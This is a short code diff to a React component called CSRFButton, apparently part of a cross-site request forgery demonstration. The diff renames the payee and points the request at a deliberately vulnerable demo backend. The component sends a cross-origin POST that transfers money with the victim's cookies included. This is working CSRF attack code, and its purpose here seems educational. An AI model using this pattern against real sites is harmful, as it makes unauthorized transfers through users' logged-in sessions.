@@ -3,9 +3,9 @@ import React from "react";
 const CSRFButton = () => {
   function sendRequest() {
     const body = new URLSearchParams(
-      "amount=1000&to=Preveranti"
+      "amount=1000&to=Prevaranti"
     );
-    fetch("http://localhost:8001/transfer", {
+    fetch("https://vulnerablebackend.onrender.com/transfer", {
       body,
       credentials: "include", // include cookies, despite being a cross-origin request
       method: "post",
